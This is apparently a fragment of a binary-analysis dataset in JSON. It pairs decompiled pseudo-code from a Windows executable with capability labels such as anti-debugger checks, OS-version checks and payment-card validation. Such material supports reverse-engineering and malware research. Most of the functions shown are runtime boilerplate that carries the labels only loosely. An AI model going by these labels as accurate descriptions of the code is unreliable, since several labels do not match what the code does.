        "decompiled_code": "\nvoid __cdecl fcn.00418c50(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x43dd14) {\n        return;\n    }\n    *0x7e01d8 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x7e01dc = &arg_8h;\n    *0x7e0118 = 0x10001;\n    *0x7e00c0 = 0xc0000409;\n    *0x7e00c4 = 1;\n    var_328h = *0x43dd14;\n    var_324h = *0x43dd18;\n    *0x7e00cc = unaff_retaddr;\n    *0x7e01a4 = in_GS;\n    *0x7e01a8 = in_FS;\n    *0x7e01ac = in_ES;\n    *0x7e01b0 = in_DS;\n    *0x7e01b4 = unaff_EDI;\n    *0x7e01b8 = unaff_ESI;\n    *0x7e01bc = unaff_EBX;\n    *0x7e01c0 = in_EDX;\n    *0x7e01c4 = in_ECX;\n    *0x7e01c8 = in_EAX;\n    *0x7e01cc = unaff_EBP;\n    *0x7e01d0 = unaff_retaddr;\n    *0x7e01d4 = in_CS;\n    *0x7e01e0 = in_SS;\n    *0x7e0110 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.00416990(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x4079d8);\n    if (*0x7e0110 == 0) {\n        fcn.00416990(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 861
    },
    "004199df": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004199df(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    \n    if (*(unaff_EBP + 8) == 2) {\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(0x43e880);\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "0041a317": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041a317(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    \n    if (*(unaff_EBP + 8) == 2) {\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(0x43e880);\n    }\n    return;\n}\n",
        "token_count": 70
    },
    "0041a5ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0041a5ec(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_28h;\n    \n    if (*(unaff_EBP + -0x28) != 0) {\n        fcn.0040d530(0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0041a710": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a710(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint hModule;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_1ch = 0;\n    var_4h = fcn.00412810();\n    var_18h = 0;\n    bVar1 = false;\n    var_14h = 0;\n    if (*0x7e0070 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x406120);\n        if (iVar2 == 0) {\n            return 0;\n        }\n        var_1ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x406114);\n        if (var_1ch == 0) {\n            return 0;\n        }\n        *0x7e0070 = fcn.00412740(var_1ch);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x406104);\n        *0x7e0074 = fcn.00412740(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x4060f0);\n        *0x7e0078 = fcn.00412740(uVar3);\n        var_1ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x4060d4);\n        *0x7e0080 = fcn.00412740(var_1ch);\n        if (*0x7e0080 != 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x4060bc);\n            *0x7e007c = fcn.00412740(uVar3);\n        }\n    }\n    if ((*0x7e007c != var_4h) && (*0x7e0080 != var_4h)) {\n        pcVar4 = fcn.00412830(*0x7e007c);\n        pcVar5 = fcn.00412830(*0x7e0080);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((var_14h = (*pcVar4)(),  var_14h == 0 ||\n             (iVar2 = (*pcVar5)(var_14h, 1, &var_10h, 0xc, &var_20h),  iVar2 == 0)) || ((var_8h & 1) == 0)))) {\n            bVar1 = true;\n        }\n    }\n    if (bVar1) {\n        arg_10h = arg_10h | 0x200000;\n    }\n    else {\n        if ((*0x7e0074 != var_4h) && (pcVar4 = fcn.00412830(*0x7e0074),  pcVar4 != NULL)) {\n            var_18h = (*pcVar4)();\n        }\n        if (((var_18h != 0) && (*0x7e0078 != var_4h)) && (pcVar4 = fcn.00412830(*0x7e0078),  pcVar4 != NULL)) {\n            var_18h = (*pcVar4)(var_18h);\n        }\n    }\n    pcVar4 = fcn.00412830(*0x7e0070);\n    if (pcVar4 == NULL) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = (*pcVar4)(var_18h, arg_8h, arg_ch, arg_10h);\n    }\n    return uVar3;\n}\n",
        "token_count": 948
    },
    "0041a960": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0041a960(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_14h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        if (arg_8h == 0) {\n            iVar3 = fcn.0040d550(2, 0x406190, 0x37, 0, 0x4061f4, var_ch);\n            if (iVar3 == 1) {\n                pcVar1 = swi(3);\n                uVar2 = (*pcVar1)();\n                return uVar2;\n            }\n        }\n        if (arg_8h != 0) {\n            if ((arg_10h == 0) || (arg_ch < arg_14h)) {\n                fcn.0040a490(arg_8h, 0, arg_ch);\n                if (arg_10h == 0) {\n                    iVar3 = fcn.0040d550(2, 0x406190, 0x3d, 0, 0x406164, var_ch);\n                    if (iVar3 == 1) {\n                        pcVar1 = swi(3);\n                        uVar2 = (*pcVar1)();\n                        return uVar2;\n                    }\n                }\n                if (arg_10h != 0) {\n                    if (arg_14h > arg_ch) {\n                        iVar3 = fcn.0040d550(2, 0x406190, 0x3e, 0, 0x406138, 0);\n                        if (iVar3 == 1) {\n                            pcVar1 = swi(3);\n                            uVar2 = (*pcVar1)();\n                            return uVar2;\n                        }\n                    }\n                    if (arg_14h <= arg_ch) {\n                        uVar2 = 0x16;\n                    }\n                    else {\n                        puVar4 = fcn.00410690();\n                        *puVar4 = 0x22;\n                        fcn.00410420(0x406138, 0x40617c, 0x406190, 0x3e, 0);\n                        uVar2 = 0x22;\n                    }\n                }\n                else {\n                    puVar4 = fcn.00410690();\n                    *puVar4 = 0x16;\n                    fcn.00410420(0x406164, 0x40617c, 0x406190, 0x3d, 0);\n                    uVar2 = 0x16;\n                }\n            }\n            else {\n                fcn.00418c60(arg_8h, arg_10h, arg_14h);\n                uVar2 = 0;\n            }\n        }\n        else {\n            puVar4 = fcn.00410690();\n            *puVar4 = 0x16;\n            fcn.00410420(0x4061f4, 0x40617c, 0x406190, 0x37, 0);\n            uVar2 = 0x16;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 759
    },
    "0041b3c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl fcn.0041b3c0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_24h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = *0x43dd14 ^ &stack0xfffffffc;\n    var_8h = 0;\n    var_4h = 0;\n    fcn.0040a310(arg_10h);\n    arg_24h = fcn.0040a420();\n    var_8h = fcn.00413000(&var_1ch, &var_ch, arg_ch, 0, 0, 0, 0, arg_24h);\n    var_4h = fcn.0041e4f0(&var_1ch, arg_8h);\n    if ((var_8h & 3) == 0) {\n        if (var_4h == 1) {\n            fcn.0040a3f0();\n            goto code_r0x0041b4b3;\n        }\n        if (var_4h == 2) {\n            fcn.0040a3f0();\n            goto code_r0x0041b4b3;\n        }\n    }\n    else {\n        if ((var_8h & 1) != 0) {\n            fcn.0040a3f0();\n            goto code_r0x0041b4b3;\n        }\n        if ((var_8h & 2) != 0) {\n            fcn.0040a3f0();\n            goto code_r0x0041b4b3;\n        }\n    }\n    fcn.0040a3f0(arg_10h, 0);\ncode_r0x0041b4b3:\n    fcn.00418c50(arg_10h);\n    return;\n}\n",
        "token_count": 496
    },
    "0041b4d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl fcn.0041b4d0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_24h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_10h = *0x43dd14 ^ &stack0xfffffffc;\n    var_8h = 0;\n    var_4h = 0;\n    fcn.0040a310(arg_10h);\n    arg_24h = fcn.0040a420();\n    var_8h = fcn.00413000(&var_1ch, &var_ch, arg_ch, 0, 0, 0, 0, arg_24h);\n    var_4h = fcn.0041eb40(&var_1ch, arg_8h);\n    if ((var_8h & 3) == 0) {\n        if (var_4h == 1) {\n            fcn.0040a3f0();\n            goto code_r0x0041b5c3;\n        }\n        if (var_4h == 2) {\n            fcn.0040a3f0();\n            goto code_r0x0041b5c3;\n        }\n    }\n    else {\n        if ((var_8h & 1) != 0) {\n            fcn.0040a3f0();\n            goto code_r0x0041b5c3;\n        }\n        if ((var_8h & 2) != 0) {\n            fcn.0040a3f0();\n            goto code_r0x0041b5c3;\n        }\n    }\n    fcn.0040a3f0(arg_10h, 0);\ncode_r0x0041b5c3:\n    fcn.00418c50(arg_10h);\n    return;\n}\n",
        "token_count": 494
    },
    "0041d560": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041d560(uint32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t arg_1ch;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *piVar5;\n    int32_t *in_FS_OFFSET;\n    bool bVar6;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_10h;\n    code *pcStack16;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0xfffffffe;\n    pcStack16 = fcn.0040d9c0;\n    var_10h = *in_FS_OFFSET;\n    var_8h = *0x43dd14 ^ 0x42cc28;\n    arg_1ch = *0x43dd14 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_10h;\n    if (arg_8h == 0xfffffffe) {\n        puVar2 = fcn.00410690();\n        *puVar2 = 9;\n        var_1ch = -1;\n        goto code_r0x0041d765;\n    }\n    if ((arg_8h < 0) || (*0x7e04e8 <= arg_8h)) {\n        bVar6 = false;\n    }\n    else {\n        bVar6 = true;\n    }\n    if ((!bVar6) && (iVar3 = fcn.0040d550(2, 0x406678, 0x2c, 0, 0x4066d8, arg_1ch),  iVar3 == 1)) {\n        pcVar1 = swi(3);\n        iVar3 = (*pcVar1)();\n        return iVar3;\n    }\n    if (!bVar6) {\n        puVar2 = fcn.00410690();\n        *puVar2 = 9;\n        fcn.00410420(0x4066d8, 0x406664, 0x406678, 0x2c, 0);\n        var_1ch = -1;\n        goto code_r0x0041d765;\n    }\n    bVar6 = (*(*((arg_8h >> 5) * 4 + 0x7e0500) + 4 + (arg_8h & 0x1f) * 0x40) & 1) == 0;\n    if ((bVar6) && (iVar3 = fcn.0040d550(2, 0x406678, 0x2d, 0, 0x40662c, arg_1ch),  iVar3 == 1)) {\n        pcVar1 = swi(3);\n        iVar3 = (*pcVar1)();\n        return iVar3;\n    }\n    if (bVar6) {\n        puVar2 = fcn.00410690();\n        *puVar2 = 9;\n        fcn.00410420(0x40662c, 0x406664, 0x406678, 0x2d, 0);\n        var_1ch = -1;\n        goto code_r0x0041d765;\n    }\n    fcn.0041d430(arg_8h);\n    var_4h = 0;\n    if ((*(*((arg_8h >> 5) * 4 + 0x7e0500) + 4 + (arg_8h & 0x1f) * 0x40) & 1) == 0) {\ncode_r0x0041d713:\n        puVar2 = fcn.00410690();\n        *puVar2 = 9;\n        var_1ch = -1;\n        iVar3 = fcn.0040d550(2, 0x406678, 0x45, 0, 0x403530, arg_1ch);\n        if (iVar3 == 1) {\n            pcVar1 = swi(3);\n            iVar3 = (*pcVar1)();\n            return iVar3;\n        }\n    }\n    else {\n        uVar4 = fcn.0041d2c0(arg_8h);\n        iVar3 = (*_sym.imp.KERNEL32.dll_FlushFileBuffers)(uVar4);\n        if (iVar3 == 0) {\n            var_1ch = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            var_1ch = 0;\n        }\n        if (var_1ch != 0) {\n            piVar5 = fcn.004106c0();\n            *piVar5 = var_1ch;\n            goto code_r0x0041d713;\n        }\n    }\n    var_4h = 0xfffffffe;\n    fcn.0041d755(arg_1ch);\ncode_r0x0041d765:\n    *in_FS_OFFSET = var_10h;\n    return var_1ch;\n}\n",
        "token_count": 1119
    },
    "0041f0b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0041f0b0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x41f16e;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.0041f1a0;\n        uStack36 = *0x43dd14 ^ &fcn.0041f0b0::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.0041f0b0::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.00412dc0();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.0041f0b0::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 734
    },
    "00420c80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00420c80(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint hModule;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_1ch = 0;\n    var_4h = fcn.00412810();\n    var_18h = 0;\n    bVar1 = false;\n    var_14h = 0;\n    if (*0x7e00a8 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4074b0);\n        if (iVar2 == 0) {\n            return 0;\n        }\n        var_1ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x4074a4);\n        if (var_1ch == 0) {\n            return 0;\n        }\n        *0x7e00a8 = fcn.00412740(var_1ch);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x406104);\n        *0x7e00ac = fcn.00412740(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x4060f0);\n        *0x7e00b0 = fcn.00412740(uVar3);\n        var_1ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x407488);\n        *0x7e00b8 = fcn.00412740(var_1ch);\n        if (*0x7e00b8 != 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x4060bc);\n            *0x7e00b4 = fcn.00412740(uVar3);\n        }\n    }\n    if ((*0x7e00b4 != var_4h) && (*0x7e00b8 != var_4h)) {\n        pcVar4 = fcn.00412830(*0x7e00b4);\n        pcVar5 = fcn.00412830(*0x7e00b8);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((var_14h = (*pcVar4)(),  var_14h == 0 ||\n             (iVar2 = (*pcVar5)(var_14h, 1, &var_10h, 0xc, &var_20h),  iVar2 == 0)) || ((var_8h & 1) == 0)))) {\n            bVar1 = true;\n        }\n    }\n    if (bVar1) {\n        arg_10h = arg_10h | 0x200000;\n    }\n    else {\n        if ((*0x7e00ac != var_4h) && (pcVar4 = fcn.00412830(*0x7e00ac),  pcVar4 != NULL)) {\n            var_18h = (*pcVar4)();\n        }\n        if (((var_18h != 0) && (*0x7e00b0 != var_4h)) && (pcVar4 = fcn.00412830(*0x7e00b0),  pcVar4 != NULL)) {\n            var_18h = (*pcVar4)(var_18h);\n        }\n    }\n    pcVar4 = fcn.00412830(*0x7e00a8);\n    if (pcVar4 == NULL) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = (*pcVar4)(var_18h, arg_8h, arg_ch, arg_10h);\n    }\n    return uVar3;\n}\n",
        "token_count": 963
    },
    "0042616d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0042616d(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint var_2ch;\n    \n    iVar1 = fcn.00412dc0();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.00412dc0();\n        *(unaff_EBP + -0x2c) = iVar1 + 0x90;\n        **(unaff_EBP + -0x2c) = **(unaff_EBP + -0x2c) + -1;\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "00426458": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426458(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    uint var_4ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    *(*(unaff_EBP + 0xc) + -4) = *(unaff_EBP + -0x20);\n    fcn.0041f330(*(unaff_EBP + -0x1c));\n    iVar1 = fcn.00412dc0();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x38);\n    iVar1 = fcn.00412dc0();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x34);\n    if ((((**(unaff_EBP + 8) == -0x1f928c9d) && (*(*(unaff_EBP + 8) + 0x10) == 3)) &&\n        ((*(*(unaff_EBP + 8) + 0x14) == 0x19930520 ||\n         ((*(*(unaff_EBP + 8) + 0x14) == 0x19930521 || (*(*(unaff_EBP + 8) + 0x14) == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x24) == 0 && (*(unaff_EBP + -0x30) != 0)))) {\n        iVar1 = fcn.0041f300(*(*(unaff_EBP + 8) + 0x18));\n        if (iVar1 != 0) {\n            fcn.00426900(*(unaff_EBP + 8), *(unaff_EBP + -0x4c));\n        }\n    }\n    return;\n}\n",
        "token_count": 431
    },
    "00409bd0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409bd0(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00409ba0();\n    if ((arg_8h & 1) != 0) {\n        fcn.00409c30(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 80
    },
    "00425d30": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00425d30(uint32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_4h;\n    \n    fcn.00425d10();\n    if ((arg_8h & 1) != 0) {\n        fcn.00409c30(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 80
    },
    "00414760": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid fcn.00414760(void)\n\n{\n    uint32_t uVar1;\n    uint32_t lpPerformanceCount;\n    uint32_t var_14h;\n    uint32_t var_ch;\n    uint32_t lpSystemTimeAsFileTime;\n    uint32_t var_4h;\n    \n    lpSystemTimeAsFileTime = 0;\n    var_4h = 0;\n    if ((*0x43dd14 == 0xbb40e64e) || ((*0x43dd14 & 0xffff0000) == 0)) {\n        (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(&lpSystemTimeAsFileTime);\n        var_ch = lpSystemTimeAsFileTime ^ var_4h;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        var_ch = uVar1 ^ var_ch;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        var_ch = uVar1 ^ var_ch;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        var_ch = uVar1 ^ var_ch;\n        (*_sym.imp.KERNEL32.dll_QueryPerformanceCounter)(&lpPerformanceCount);\n        var_ch = var_ch ^ lpPerformanceCount ^ var_14h;\n        if (var_ch == 0xbb40e64e) {\n            var_ch = 0xbb40e64f;\n        }\n        else if ((var_ch & 0xffff0000) == 0) {\n            var_ch = var_ch << 0x10 | var_ch;\n        }\n        *0x43dd14 = var_ch;\n        *0x43dd18 = ~var_ch;\n    }\n    else {\n        *0x43dd18 = ~*0x43dd14;\n    }\n    return;\n}\n",
        "token_count": 392
    },
    "00408e75": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408e75(uint32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint var_4h;\n    \n    *arg_8h = arg_10h ^ arg_ch;\n    return;\n}\n",
        "token_count": 62
    },
    "00408eb5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408eb5(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    *arg_8h = *arg_8h + arg_ch;\n    return;\n}\n",
        "token_count": 47
    },
    "00409198": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00409198(void)\n\n{\n    *0x7da318 = *0x7da318 + 0x1445;\n    return;\n}\n",
        "token_count": 36
    },
    "00409ba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409ba0(uint *param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = 0x401664;\n    fcn.0040d080(param_1);\n    return;\n}\n",
        "token_count": 54
    },
    "00409cfa": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00409cfa(void)\n\n{\n    fcn.0040d530(4);\n    return;\n}\n",
        "token_count": 27
    },
    "0040a07b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a07b(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    \n    fcn.00410370(*(unaff_EBP + 8));\n    return;\n}\n",
        "token_count": 49
    },
    "0040a430": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a430(uint arg_8h)\n\n{\n    fcn.0040a1e0(arg_8h, 0);\n    return;\n}\n",
        "token_count": 40
    },
    "0040af20": {
        "rules": [
